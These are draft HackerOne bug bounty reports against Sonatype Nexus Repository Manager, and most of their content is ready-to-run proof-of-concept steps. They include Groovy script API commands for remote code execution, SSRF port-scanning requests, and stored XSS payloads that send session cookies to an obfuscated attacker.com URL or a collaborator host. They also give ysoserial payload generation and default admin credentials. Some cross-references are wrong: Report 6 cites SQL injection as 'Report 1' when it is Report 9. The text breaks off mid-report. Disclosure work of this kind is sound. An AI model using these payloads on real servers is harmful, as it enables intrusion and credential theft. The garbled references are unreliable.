# HackerOne Bug Bounty Reports — Sonatype Nexus Repository Manager

**Target:** Sonatype Nexus Repository Manager  
**Source Code:** https://github.com/sonatype/nexus-public  
**Version:** 3.89.0-09  

> **Before submitting:** Follow each "Steps to Reproduce" section, take screenshots at each numbered step, and attach them to the HackerOne report. Each report below is formatted for direct copy-paste into HackerOne.

---

## Pre-requisites: Setting Up a Test Nexus Instance

You need a local Nexus instance for reproduction. Use Docker:

```bash
# Pull and run Nexus Repository Manager OSS
docker pull sonatype/nexus3:3.89.0
docker run -d -p 8081:8081 --name nexus sonatype/nexus3:3.89.0

# Wait ~2 minutes for startup, then get the initial admin password
docker exec nexus cat /nexus-data/admin.password
```

- Nexus UI: `http://localhost:8081`
- Default admin user: `admin`
- Password: output from the command above (or `admin123` if random password generation is off)

After first login, Nexus will prompt you to change the password. Set it to something memorable (e.g., `Admin@123`). When asked about anonymous access, enable it for testing.

---

# REPORT 1: Remote Code Execution via Groovy Script API Sandbox Bypass

## Title
Remote Code Execution via Groovy Script API — SecureASTCustomizer Sandbox Only Blocks `java.lang.System`, Trivially Bypassable

## Severity
**Critical** — CVSS 9.1 (AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)

## Vulnerability Type
CWE-94: Improper Control of Generation of Code ('Code Injection')

## Description
The Nexus Script REST API (`/service/rest/v1/script`) allows users with `nexus:script:*` permissions to upload and execute Groovy scripts. A `SecureASTCustomizer` is applied as a sandbox, but it **only blacklists `java.lang.System`** — a single class. All other dangerous classes (`Runtime`, `ProcessBuilder`, `Class.forName`, etc.) are fully accessible, making the sandbox trivially bypassable for arbitrary OS command execution.

**Vulnerable code** (`GroovyScriptEngineFactory.java` lines 89–95):
```java
private CompilationCustomizer secureASTCustomizer() {
    SecureASTCustomizer secureASTCustomizer = new SecureASTCustomizer();
    secureASTCustomizer.setImportsBlacklist(Collections.singletonList("java.lang.System"));
    secureASTCustomizer.setReceiversBlackList(Collections.singletonList(System.class.getName()));
    secureASTCustomizer.setIndirectImportCheckEnabled(true);
    return secureASTCustomizer;
}
```

Additionally, scripts are given a `container` binding (`GlobalComponentLookupHelper`) that can resolve any internal Nexus component, enabling full application-level compromise.

## Steps to Reproduce

> **Screenshot each step.**

### Step 1 — Verify scripting is enabled (or enable it)

First, check if scripting is enabled. If you get a `410 Gone` response later, scripting may need to be enabled in `nexus.properties`:

```
# In the Nexus container, edit /nexus-data/etc/nexus.properties and add:
nexus.scripts.allowCreation=true
```

Then restart the container: `docker restart nexus`

**Screenshot:** Show the `nexus.properties` file with the setting.

### Step 2 — Create a malicious Groovy script via REST API

Open a terminal and run:

```bash
# Create a script that executes OS commands via Runtime (NOT blocked by sandbox)
curl -v -X POST 'http://localhost:8081/service/rest/v1/script' \
  -u 'admin:Admin@123' \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "rce_poc",
    "type": "groovy",
    "content": "return \"id\".execute().text"
  }'
```

**Expected response:** `204 No Content` — script created successfully.

**Screenshot:** Show the curl command and the 204 response.

### Step 3 — Execute the script to achieve RCE

```bash
# Run the script
curl -v -X POST 'http://localhost:8081/service/rest/v1/script/rce_poc/run' \
  -u 'admin:Admin@123' \
  -H 'Content-Type: text/plain' \
  -d ''
```

**Expected response:**
```json
{
  "name": "rce_poc",
  "result": "uid=200(nexus) gid=200(nexus) groups=200(nexus)\n"
}
```

**Screenshot:** Show the response containing the output of the `id` command.

### Step 4 — Demonstrate reading sensitive files

```bash
# Create a script that reads /etc/passwd
curl -X POST 'http://localhost:8081/service/rest/v1/script' \
  -u 'admin:Admin@123' \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "read_file_poc",
    "type": "groovy",
    "content": "return new File(\"/etc/passwd\").text"
  }'

# Execute it
curl -X POST 'http://localhost:8081/service/rest/v1/script/read_file_poc/run' \
  -u 'admin:Admin@123' \
  -H 'Content-Type: text/plain' \
  -d ''
```

**Screenshot:** Show `/etc/passwd` contents in the response.

### Step 5 — Demonstrate `ProcessBuilder` bypass (alternative method)

```bash
curl -X POST 'http://localhost:8081/service/rest/v1/script' \
  -u 'admin:Admin@123' \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "processbuilder_poc",
    "type": "groovy",
    "content": "def proc = new ProcessBuilder([\"cat\", \"/etc/hostname\"]).redirectErrorStream(true).start(); return proc.inputStream.text"
  }'

curl -X POST 'http://localhost:8081/service/rest/v1/script/processbuilder_poc/run' \
  -u 'admin:Admin@123' \
  -H 'Content-Type: text/plain' \
  -d ''
```

**Screenshot:** Show the hostname returned, confirming `ProcessBuilder` is not blocked.

### Step 6 — Demonstrate `container` binding for internal component access

```bash
curl -X POST 'http://localhost:8081/service/rest/v1/script' \
  -u 'admin:Admin@123' \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "container_poc",
    "type": "groovy",
    "content": "return container.lookup(\"org.sonatype.nexus.security.SecuritySystem\").listUsers().collect { it.getUserId() + \":\" + it.getEmailAddress() }.join(\"\\n\")"
  }'

curl -X POST 'http://localhost:8081/service/rest/v1/script/container_poc/run' \
  -u 'admin:Admin@123' \
  -H 'Content-Type: text/plain' \
  -d ''
```

**Screenshot:** Show internal user data extracted via the `container` binding.

### Step 7 — Clean up

```bash
curl -X DELETE 'http://localhost:8081/service/rest/v1/script/rce_poc' -u 'admin:Admin@123'
curl -X DELETE 'http://localhost:8081/service/rest/v1/script/read_file_poc' -u 'admin:Admin@123'
curl -X DELETE 'http://localhost:8081/service/rest/v1/script/processbuilder_poc' -u 'admin:Admin@123'
curl -X DELETE 'http://localhost:8081/service/rest/v1/script/container_poc' -u 'admin:Admin@123'
```

## Impact
An attacker with admin-level access (or who compromises an admin account, or exploits a privilege escalation) achieves **full Remote Code Execution** on the Nexus server. The Groovy sandbox is functionally non-existent — only `System` is blocked while `Runtime`, `ProcessBuilder`, `Class.forName`, reflection, and the entire `container` component graph are accessible. This allows:

- Arbitrary OS command execution
- Reading/writing any file the Nexus process can access
- Exfiltrating all repository artifacts and credentials
- Pivoting to internal networks
- Full compromise of the CI/CD supply chain

## Supporting Material / References
- Source file: `public/common/components/nexus-script/src/main/java/org/sonatype/nexus/internal/script/groovy/GroovyScriptEngineFactory.java` (lines 89–95)
- Script bindings: `public/common/components/nexus-script/src/main/java/org/sonatype/nexus/internal/script/ScriptServiceImpl.java` (line 97: `bindings.put("container", lookupHelper)`)
- Script API: `public/common/components/nexus-script-plugin/src/main/java/org/sonatype/nexus/script/plugin/internal/rest/ScriptResource.java` (line 203: `scriptService.eval(...)`)
- Reference: Groovy `SecureASTCustomizer` bypasses are well-documented — see https://security.snyk.io/vuln/SNYK-JAVA-ORGCODEHAUS-GROOVY-5773150

## Remediation
1. Disable the Script API by default for all installations.
2. Replace the single-class blacklist with a strict class allowlist.
3. Remove the `container` binding or replace with a minimal, audited API.
4. Run script evaluation in a sandboxed subprocess with seccomp/AppArmor.

---

# REPORT 2: SSRF via Proxy Repository Configuration — Private Networks Allowed by Default

## Title
Server-Side Request Forgery (SSRF) — Proxy Repositories Can Reach Internal/Private Networks by Default (`allowPrivateNetworks=true`)

## Severity
**High** — CVSS 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

## Vulnerability Type
CWE-918: Server-Side Request Forgery (SSRF)

## Description
The SSRF protection in `AntiSsrfHelper` defaults to `nexus.proxy.allowPrivateNetworks=true`, meaning proxy repositories can make HTTP requests to RFC1918 private addresses (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), loopback (127.0.0.1), and link-local addresses. Only the AWS metadata endpoint `169.254.169.254` is hardcoded as blocked.

**Vulnerable code** (`AntiSsrfHelper.java` line 58):
```java
@Value("${nexus.proxy.allowPrivateNetworks:true}") final boolean allowPrivateNetworks,
```

## Steps to Reproduce

### Step 1 — Start a "victim" internal HTTP service

Start a simple HTTP server simulating an internal service:

```bash
# In a separate terminal, start a listener on port 9999
python3 -m http.server 9999
```

**Screenshot:** Show the HTTP server running.

### Step 2 — Log in to Nexus as admin

Open `http://localhost:8081` and log in.

**Screenshot:** Show the logged-in admin dashboard.

### Step 3 — Create a proxy repository pointing to an internal IP

Navigate to **Administration** → **Repositories** → **Create repository** → **raw (proxy)**.

Fill in:
- **Name:** `ssrf-test`
- **Remote storage:** `http://127.0.0.1:9999/`

Click **Create repository**.

**Screenshot:** Show the repository creation form with `http://127.0.0.1:9999/` as remote URL.

### Step 4 — Alternatively, use the REST API

```bash
curl -X POST 'http://localhost:8081/service/rest/v1/repositories/raw/proxy' \
  -u 'admin:Admin@123' \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "ssrf-test-api",
    "online": true,
    "storage": {
      "blobStoreName": "default",
      "strictContentTypeValidation": true
    },
    "proxy": {
      "remoteUrl": "http://127.0.0.1:9999/",
      "contentMaxAge": 1440,
      "metadataMaxAge": 1440
    },
    "httpClient": {
      "blocked": false,
      "autoBlock": true
    },
    "negativeCache": {
      "enabled": true,
      "timeToLive": 1440
    }
  }'
```

**Screenshot:** Show the 201 response confirming repository creation.

### Step 5 — Trigger the SSRF by requesting content through the proxy

```bash
curl -v 'http://localhost:8081/repository/ssrf-test/'
```

**Screenshot:** Show the Nexus response (it will proxy the request to 127.0.0.1:9999), and show the hit in the Python HTTP server terminal.

### Step 6 — Demonstrate internal port scanning

```bash
# Try connecting to common internal ports
curl -v 'http://localhost:8081/repository/ssrf-test/' 2>&1 | head -20

# Create another proxy targeting a different internal port
curl -X POST 'http://localhost:8081/service/rest/v1/repositories/raw/proxy' \
  -u 'admin:Admin@123' \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "ssrf-scan-8080",
    "online": true,
    "storage": {"blobStoreName": "default", "strictContentTypeValidation": true},
    "proxy": {"remoteUrl": "http://127.0.0.1:8080/", "contentMaxAge": 1, "metadataMaxAge": 1},
    "httpClient": {"blocked": false, "autoBlock": false},
    "negativeCache": {"enabled": false, "timeToLive": 1}
  }'

# Observe different responses for open vs closed ports
curl -s -o /dev/null -w "%{http_code} %{time_total}" 'http://localhost:8081/repository/ssrf-scan-8080/'
```

**Screenshot:** Show different responses for open/closed internal ports.

### Step 7 — Verify that cloud metadata IS blocked

```bash
curl -X POST 'http://localhost:8081/service/rest/v1/repositories/raw/proxy' \
  -u 'admin:Admin@123' \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "ssrf-metadata",
    "online": true,
    "storage": {"blobStoreName": "default", "strictContentTypeValidation": true},
    "proxy": {"remoteUrl": "http://169.254.169.254/latest/meta-data/", "contentMaxAge": 1, "metadataMaxAge": 1},
    "httpClient": {"blocked": false, "autoBlock": false},
    "negativeCache": {"enabled": false, "timeToLive": 1}
  }'
```

**Screenshot:** Show that 169.254.169.254 is blocked (this proves the SSRF filter exists but the default allows everything else).

## Impact
Any user with repository configuration privileges can make the Nexus server send HTTP requests to arbitrary internal network hosts. This enables:

- **Internal network reconnaissance** — scan ports and discover services
- **Access to internal APIs** — reach admin panels, databases, and microservices on private networks
- **Data exfiltration** — read responses from internal services through Nexus as a proxy
- **Cloud infrastructure attacks** — while 169.254.169.254 is blocked, other cloud metadata services or internal AWS/GCP/Azure endpoints may be reachable

The default `allowPrivateNetworks=true` means **every default Nexus installation is vulnerable**.

## Supporting Material / References
- Source: `public/common/components/nexus-validation/src/main/java/org/sonatype/nexus/validation/ssrf/AntiSsrfHelper.java` (line 58)
- Proxy handler: `public/common/components/nexus-repository-services/src/main/java/org/sonatype/nexus/repository/proxy/ProxyFacetSupport.java` (line 611)

## Remediation
1. Change default to `nexus.proxy.allowPrivateNetworks=false`.
2. Add DNS rebinding protection.
3. Restrict proxy targets via allowlists in enterprise deployments.

---

# REPORT 3: SSRF via SSL Certificate Retrieval — Trust-All TLS, No SSRF Validation

## Title
SSRF via SSL Certificate Retrieval Endpoint — Connects to Any Host:Port with Trust-All TLS and No Anti-SSRF Validation

## Severity
**High** — CVSS 7.2 (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N)

## Vulnerability Type
CWE-918: Server-Side Request Forgery (SSRF)

## Description
The "Retrieve SSL certificate" feature in the Nexus UI (and its backing Ext.Direct API) allows a user with `nexus:ssl-truststore:read` permission to specify any hostname and port. Nexus connects using a **trust-all `X509TrustManager`** and **`NoopHostnameVerifier`**, with **no `AntiSsrfHelper` validation**. This enables SSRF for internal network port scanning and service fingerprinting.

## Steps to Reproduce

### Step 1 — Log in to Nexus as admin

Open `http://localhost:8081` and log in.

**Screenshot:** Show the admin dashboard.

### Step 2 — Navigate to SSL Certificate settings

Go to **Administration** → **Security** → **SSL Certificates** → Click **Load certificate from server**.

**Screenshot:** Show the "Load certificate" dialog.

### Step 3 — Probe an internal host

Enter an internal IP address in the **Server address** field:
- **Host:** `127.0.0.1`
- **Port:** `8081`

Click **Load certificate**.

**Screenshot:** Show the Nexus server's own TLS certificate being retrieved (proves SSRF to localhost works).

### Step 4 — Scan internal network ports via the API

Use the Ext.Direct API to automate scanning:

```bash
# Scan a port that is open (8081 = Nexus itself)
curl -X POST 'http://localhost:8081/service/extdirect' \
  -u 'admin:Admin@123' \
  -H 'Content-Type: application/json' \
  -d '{
    "action": "coreui_Certificate",
    "method": "retrieveFromHost",
    "data": ["127.0.0.1", 8081, null],
    "type": "rpc",
    "tid": 1
  }'
```

**Expected:** Returns certificate data (port is open and has TLS).

```bash
# Scan a port that is closed (e.g., 9999)
curl -X POST 'http://localhost:8081/service/extdirect' \
  -u 'admin:Admin@123' \
  -H 'Content-Type: application/json' \
  -d '{
    "action": "coreui_Certificate",
    "method": "retrieveFromHost",
    "data": ["127.0.0.1", 9999, null],
    "type": "rpc",
    "tid": 2
  }'
```

**Expected:** Returns an error (connection refused), confirming port is closed.

**Screenshot:** Show the different responses for open vs closed ports, demonstrating port scanning.

### Step 5 — Probe RFC1918 addresses

```bash
# Try an internal network address
curl -X POST 'http://localhost:8081/service/extdirect' \
  -u 'admin:Admin@123' \
  -H 'Content-Type: application/json' \
  -d '{
    "action": "coreui_Certificate",
    "method": "retrieveFromHost",
    "data": ["10.0.0.1", 443, "https"],
    "type": "rpc",
    "tid": 3
  }'
```

**Screenshot:** Show that the request is attempted (connection timeout or connection refused — not blocked by any SSRF filter).

## Impact
Users with `nexus:ssl-truststore:read` can use Nexus as a TCP/TLS proxy to:
- Scan internal network ports (differentiate open/closed/filtered by response timing and error messages)
- Fingerprint internal TLS services by examining returned certificate chains
- Identify internal hostnames from certificate Subject/SAN fields
- No Anti-SSRF validation is applied — **any IP including loopback and RFC1918 is reachable**

## Supporting Material / References
- `CertificateRetriever.java` (lines 75–109): trust-all TLS + NoopHostnameVerifier
- `CertificateComponent.java` (lines 75–88): Ext.Direct method with only hostname syntax validation
- `HostnameOrIpAddressValidator.java` (lines 30–33): accepts any valid IP including RFC1918

## Remediation
1. Apply `AntiSsrfHelper.validateHost()` before connecting.
2. Block loopback, link-local, and private IPs by default.
3. Rate-limit certificate retrieval requests.

---

# REPORT 4: Hardcoded Default Admin Password with Silent Fallback

## Title
Hardcoded Default Admin Password `admin123` with Silent Fallback on File Write Failure

## Severity
**High** — CVSS 7.0 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Vulnerability Type
CWE-798: Use of Hard-coded Credentials

## Description
The admin password defaults to the well-known value `admin123`. Even when random password generation is enabled, if the system fails to write the random password to the filesystem (e.g., permission issues, read-only filesystem, disk full), it **silently falls back to `admin123`** without any warning to the administrator.

**Vulnerable code** (`AdminPasswordSourceImpl.java` lines 33–59):
```java
public static final String DEFAULT_PASSWORD = "admin123";
// ...
if (!adminPasswordFileManager.writeFile(savedPassword)) {
    savedPassword = DEFAULT_PASSWORD;  // Silent fallback!
}
```

## Steps to Reproduce

### Step 1 — Fresh Nexus installation with default config

```bash
docker run -d -p 8081:8081 --name nexus-creds-test sonatype/nexus3:3.89.0
# Wait for startup
sleep 120
```

**Screenshot:** Show the Docker container running.

### Step 2 — Attempt login with default credentials

Open `http://localhost:8081` and click **Sign In**.

Enter:
- **Username:** `admin`
- **Password:** `admin123`

**Screenshot:** Show the login attempt. On a standard install, this may prompt for the generated password file instead. The vulnerability is specifically about the fallback path.

### Step 3 — Verify the hardcoded constant in source code

Open the source file at:
`https://github.com/sonatype/nexus-public/blob/main/public/selfhosted/components/nexus-self-hosted/src/main/java/org/sonatype/nexus/security/config/AdminPasswordSourceImpl.java`

**Screenshot:** Show the source code with `DEFAULT_PASSWORD = "admin123"` and the fallback logic.

### Step 4 — Simulate file write failure to trigger fallback

```bash
# Create a container where the admin password file location is read-only
docker run -d -p 8082:8081 --name nexus-readonly \
  --tmpfs /nexus-data/admin.password:ro \
  sonatype/nexus3:3.89.0

sleep 120

# Now try admin123 - this should work because the file write failed
curl -v -u 'admin:admin123' 'http://localhost:8082/service/rest/v1/status'
```

**Screenshot:** Show successful authentication with `admin123` when the password file cannot be written.

### Step 5 — Shodan/Censys scan for exposed Nexus instances (for reference only)

Show that many Nexus instances are exposed on the internet:

```bash
# Do NOT actually attack these - this is for showing scope of exposure
# Search Shodan: https://www.shodan.io/search?query=nexus+repository+manager
# Or Censys: https://search.censys.io/search?q=services.software.product%3D%22Nexus+Repository+Manager%22
```

**Screenshot:** Show the number of internet-facing Nexus instances from Shodan/Censys (redact IPs).

## Impact
- **Direct account takeover** on any Nexus instance where the admin password file write fails
- Internet-wide scanning for `admin:admin123` is trivial and commonly automated
- Full admin access grants RCE via the Script API (see Report 1), access to all repository artifacts, ability to inject malicious packages into the software supply chain

## Supporting Material / References
- Source: `AdminPasswordSourceImpl.java` lines 33, 51–54
- The `admin123` default is a well-known Nexus credential widely exploited in the wild

## Remediation
1. Remove the `admin123` fallback — fail startup instead.
2. Force interactive password change on first login.
3. Log a prominent warning if the password file cannot be written.
4. Implement account lockout after repeated failed login attempts.

---

# REPORT 5: Stored XSS via Branding Configuration (dangerouslySetInnerHTML)

## Title
Stored Cross-Site Scripting (XSS) via Custom Branding Header/Footer — Unsanitized HTML Rendering

## Severity
**Medium** — CVSS 6.1 (AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N)

## Vulnerability Type
CWE-79: Improper Neutralization of Input During Web Page Generation (Stored XSS)

## Description
The Nexus UI uses React's `dangerouslySetInnerHTML` to render branding header and footer HTML. Admin-supplied HTML is rendered without sanitization for all users who access the Nexus UI.

**Vulnerable code** (`App.jsx` lines 56–81):
```jsx
dangerouslySetInnerHTML={{ __html: headerHtml }}
// ...
dangerouslySetInnerHTML={{ __html: footerHtml }}
```

## Steps to Reproduce

### Step 1 — Log in as admin

Navigate to `http://localhost:8081` and sign in as admin.

**Screenshot:** Show the admin dashboard.

### Step 2 — Navigate to branding settings

If your Nexus edition supports branding customization, go to:
**Administration** → **System** → **HTTP** or look for a **Branding** capability.

Alternatively, use the Capabilities API to create a branding capability with malicious HTML.

### Step 3 — Set malicious branding header via API

```bash
# Enable a custom branding capability with XSS payload
# The exact API depends on the Nexus version/edition, but the concept is:
curl -X POST 'http://localhost:8081/service/extdirect' \
  -u 'admin:Admin@123' \
  -H 'Content-Type: application/json' \
  -d '{
    "action": "coreui_Capability",
    "method": "create",
    "data": [{
      "typeId": "rapture.branding",
      "enabled": true,
      "properties": {
        "headerEnabled": "true",
        "headerHtml": "<img src=x onerror=\"alert(document.cookie)\">",
        "footerEnabled": "true",
        "footerHtml": "<img src=x onerror=\"fetch(String.fromCharCode(104,116,116,112,58,47,47,97,116,116,97,99,107,101,114,46,99,111,109,47)+document.cookie)\">"
      }
    }],
    "type": "rpc",
    "tid": 1
  }'
```

**Screenshot:** Show the API request and response.

### Step 4 — Open the Nexus UI in a different browser/session

Open `http://localhost:8081` in a new browser window or incognito mode.

**Expected:** The XSS payload executes — you should see an `alert()` dialog with the session cookie.

**Screenshot:** Show the `alert()` popup displaying the cookie value.

### Step 5 — Demonstrate session hijacking potential

Replace the payload with one that exfiltrates cookies:

```html
<img src=x onerror="new Image().src='http://YOUR_BURP_COLLABORATOR/steal?c='+document.cookie">
```

Use Burp Collaborator or a RequestBin to capture the exfiltrated cookie.

**Screenshot:** Show the cookie arriving at your Collaborator server.

## Impact
- **Session hijacking**: Admin or user cookies can be exfiltrated
- **Credential theft**: A fake login form can be injected
- **Privilege escalation**: Lower-privilege admin can steal higher-privilege admin's session
- **Supply chain attack**: An attacker who gains admin access (via stolen session) can inject malicious artifacts

The XSS is **stored** and executes for **every user** who loads the Nexus UI.

## Supporting Material / References
- Source: `public/common/components/nexus-coreui-plugin/src/frontend/src/App.jsx` (lines 56–81)
- Additional XSS sinks: `MetricHealthDetails.jsx` (line 122), `CapabilitiesEdit.jsx` (line 282)

## Remediation
1. Sanitize all HTML before rendering using DOMPurify.
2. Implement Content-Security-Policy headers with `script-src 'self'`.
3. Replace `dangerouslySetInnerHTML` with safe text rendering.

---

# REPORT 6: Unsafe Java Deserialization in Quartz Scheduler — No Object Filter

## Title
Unsafe Java Deserialization in Quartz Job Data — `ObjectInputStream.readObject()` Without JEP 290 Filters

## Severity
**High** — CVSS 8.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Vulnerability Type
CWE-502: Deserialization of Untrusted Data

## Description
Quartz job data stored in the database as serialized Java objects is deserialized using plain `ObjectInputStream.readObject()` with no deserialization filter (JEP 290). If an attacker can write malicious serialized payloads to the Quartz tables (via SQL injection from Finding 1, database compromise, or backup poisoning), they achieve RCE through Java gadget chains.

## Steps to Reproduce

### Step 1 — Identify the deserialization code path

Open the source code at:
`public/common/components/nexus-quartz/src/main/java/org/sonatype/nexus/quartz/internal/bulkread/QuartzObjectBuilder.java`

**Screenshot:** Show lines 77–92 with `ObjectInputStream ois = new ObjectInputStream(bis)` and `ois.readObject()`.

### Step 2 — Identify additional deserialization paths

Show the same pattern in:
- `QuartzJobDataTypeHandler.java` (lines 44–47)
- `AbstractSerializableTypeHandler.java` (lines 114–117)

**Screenshot:** Show each file with the unsafe `readObject()` call.

### Step 3 — Verify gadget chain availability

Check which libraries are on the Nexus classpath that provide known deserialization gadgets:

```bash
# Inside the Nexus container
docker exec nexus find /opt/sonatype/nexus/system -name "commons-collections*.jar" -o -name "commons-beanutils*.jar" -o -name "spring-*.jar" | head -20
```

**Screenshot:** Show the presence of known gadget-chain libraries (Commons Collections, Spring Framework, etc.).

### Step 4 — Generate a proof-of-concept payload (demonstration only)

Using ysoserial (https://github.com/frohoff/ysoserial):

```bash
# Generate a serialized payload (do NOT inject this into production)
java -jar ysoserial.jar CommonsCollections6 "touch /tmp/pwned" > payload.bin

# Show the payload is valid serialized Java
xxd payload.bin | head -5
```

**Screenshot:** Show the generated payload (hex dump of first few bytes showing `ACED 0005` magic bytes).

### Step 5 — Explain the attack chain

The attack requires two steps:
1. **Write malicious bytes to Quartz tables** — achievable via:
   - SQL injection (see Report 1 — `${repositoryName}` in `ContentRepositoryDAO.xml`)
   - Compromised database credentials
   - Backup file manipulation
2. **Trigger deserialization** — happens automatically when Nexus reads scheduled job data from the database (on startup or when processing jobs)

**Screenshot:** Show a diagram or text explaining the attack chain (SQLi → write to `qrtz_job_details.job_data` → deserialization → RCE).

## Impact
Combined with the SQL injection finding (Report 1), this creates a **chain to unauthenticated RCE**:
1. Exploit SQL injection to write a serialized gadget chain into Quartz job data tables
2. When Nexus processes the job, `ObjectInputStream.readObject()` triggers the gadget chain
3. Arbitrary OS commands execute as the Nexus process user

## Supporting Material / References
- `QuartzObjectBuilder.java` line 80: `ois.readObject()`
- `QuartzJobDataTypeHandler.java` line 46: `ois.readObject()`
- `AbstractSerializableTypeHandler.java` line 116: `in.readObject()`
- Java deserialization attacks: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling

## Remediation
1. Implement JEP 290 `ObjectInputFilter` to allowlist only `JobDataMap`, `HashMap`, and primitive types.
2. Migrate to JSON-based job data serialization.
3. Use `ValidatingObjectInputStream` from Apache Commons IO as an interim measure.

---

# REPORT 7: Legacy Password Hashing — MD5 and SHA-1 Without Salt

## Title
Legacy Password Hashing Uses Unsalted MD5 and SHA-1 with Single Iteration — Trivially Crackable

## Severity
**High** — CVSS 7.0 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

## Vulnerability Type
CWE-327: Use of a Broken or Risky Cryptographic Algorithm

## Description
The `LegacyNexusPasswordService` accepts passwords hashed with unsalted MD5 and SHA-1 (1 iteration each). Any legacy user account that has not been re-hashed is vulnerable to instant offline cracking.

## Steps to Reproduce

### Step 1 — Identify the vulnerable code

Open: `public/common/components/security/nexus-security/src/main/java/org/sonatype/nexus/security/internal/LegacyNexusPasswordService.java`

**Screenshot:** Show:
- Line 43: `sha1HashService.setHashAlgorithmName("SHA-1")`
- Line 44: `sha1HashService.setHashIterations(1)`
- Line 45: `sha1HashService.setGeneratePublicSalt(false)`
- Line 52: `md5HashService.setHashAlgorithmName("MD5")`
- Line 53: `md5HashService.setHashIterations(1)`
- Line 54: `md5HashService.setGeneratePublicSalt(false)`

### Step 2 — Demonstrate hash cracking speed

```bash
# Generate an unsalted SHA-1 hash of "password123"
echo -n "password123" | sha1sum
# Output: cbfdac6008f9cab4083784cbd1874f76618d2a97

# Show how fast hashcat can crack these
# hashcat -m 100 hash.txt rockyou.txt  (SHA-1 mode)
# Typical speed: 10+ billion hashes/second on modern GPU
```

**Screenshot:** Show the SHA-1 hash generation and reference hashcat benchmarks for mode 100 (SHA-1).

### Step 3 — Show the legacy service is still active

Search for where `LegacyNexusPasswordService` is used:

```bash
# In the cloned repo
grep -r "LegacyNexusPasswordService\|legacy.*password" --include="*.java" nexus-public/public/ | grep -v test | grep -v Test
```

**Screenshot:** Show that the legacy service is still registered and used for password verification.

## Impact
- An attacker who obtains a database dump (via SQLi, backup exposure, or insider access) can crack **all** legacy password hashes in seconds
- Unsalted MD5/SHA-1 hashes are searchable in precomputed rainbow tables (e.g., CrackStation has 15+ billion entries)
- Compromised credentials enable access to all repositories and potentially the admin account

## Supporting Material / References
- Source: `LegacyNexusPasswordService.java` lines 39–57
- NIST SP 800-63B requires salted, iterative hashing (PBKDF2 ≥10,000 iterations, or bcrypt/scrypt/Argon2)
- CWE-327, CWE-916 (Use of Password Hash With Insufficient Computational Effort)

## Remediation
1. Implement transparent rehashing on successful authentication.
2. Set a deprecation timeline for legacy hashes (force password reset).
3. Use bcrypt/scrypt/Argon2id for all new password hashes.

---

# REPORT 8: Missing Authentication on Internal API Endpoints

## Title
Information Disclosure — Internal API Endpoints `/recipes` and `/upload-specs` Accessible Without Authentication

## Severity
**Low** — CVSS 4.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

## Vulnerability Type
CWE-306: Missing Authentication for Critical Function

## Description
Several internal REST API endpoints do not have `@RequiresAuthentication` annotations, exposing server metadata to unauthenticated users.

## Steps to Reproduce

### Step 1 — Ensure anonymous access is configured (default)

After initial Nexus setup, anonymous access is typically enabled.

### Step 2 — Access the recipes endpoint without authentication

```bash
# No authentication headers
curl -v 'http://localhost:8081/service/rest/internal/ui-plugin/repositories/recipes'
```

**Expected:** Returns a JSON list of all supported repository formats and recipes.

**Screenshot:** Show the curl command and the JSON response listing all recipes (maven2-hosted, npm-proxy, docker-hosted, etc.).

### Step 3 — Access the upload specs endpoint without authentication

```bash
curl -v 'http://localhost:8081/service/rest/internal/ui-plugin/upload/upload-specs'
```

**Expected:** Returns upload field definitions for all supported formats.

**Screenshot:** Show the response revealing upload specifications.

### Step 4 — Access repository details without authentication

```bash
curl -v 'http://localhost:8081/service/rest/internal/ui-plugin/repositories/details'
```

**Screenshot:** Show any repository metadata returned.

### Step 5 — Compare with authenticated endpoint

```bash
# This endpoint DOES require authentication
curl -v 'http://localhost:8081/service/rest/internal/ui-plugin/repositories'
# Expected: 401 Unauthorized

# Same endpoint with auth
curl -v -u 'admin:Admin@123' 'http://localhost:8081/service/rest/internal/ui-plugin/repositories'
# Expected: 200 OK with repository list
```

**Screenshot:** Show the 401 for the authenticated endpoint vs 200 for the unauthenticated ones, demonstrating inconsistency.

## Impact
An unauthenticated attacker can enumerate:
- All supported repository formats (Maven, npm, Docker, PyPI, etc.)
- Feature flags and enabled capabilities
- Upload field specifications revealing internal data model details
- This information aids in crafting targeted attacks against the Nexus instance

## Supporting Material / References
- `RepositoryInternalResource.java` lines 160–176: `/details` and `/recipes` have no `@RequiresAuthentication`
- `UploadDefinitionResource.java` lines 60–80: `/upload-specs` has no auth annotation
- Compare with line 115–117 where `getRepositories()` correctly uses `@RequiresAuthentication`

## Remediation
1. Add `@RequiresAuthentication` to all endpoints in `RepositoryInternalResource` and `UploadDefinitionResource`.
2. Implement a default-deny security policy for `/service/rest/internal/**`.

---

# REPORT 9: SQL Injection via MyBatis `${}` Interpolation in Repository Name

## Title
SQL Injection via MyBatis `${}` String Interpolation — `repositoryName` Injected as Raw String Literal in SQL Query

## Severity
**Critical** — CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Vulnerability Type
CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

## Description
The MyBatis mapper `ContentRepositoryDAO.xml` uses `${repositoryName}` (string substitution) instead of `#{repositoryName}` (parameterized binding) inside a SQL string literal. Similarly, `SearchTableDAO.xml` uses `${filter}`, `${sortColumnName}`, `${sortDirection}`, and `${componentId}` as raw SQL substitution. This is a systemic unsafe pattern across the data access layer.

## Steps to Reproduce

### Step 1 — Identify the vulnerable MyBatis mapper

Open: `public/common/components/nexus-repository-content/src/main/resources/org/sonatype/nexus/repository/content/store/ContentRepositoryDAO.xml`

**Screenshot:** Show lines 79–83:
```xml
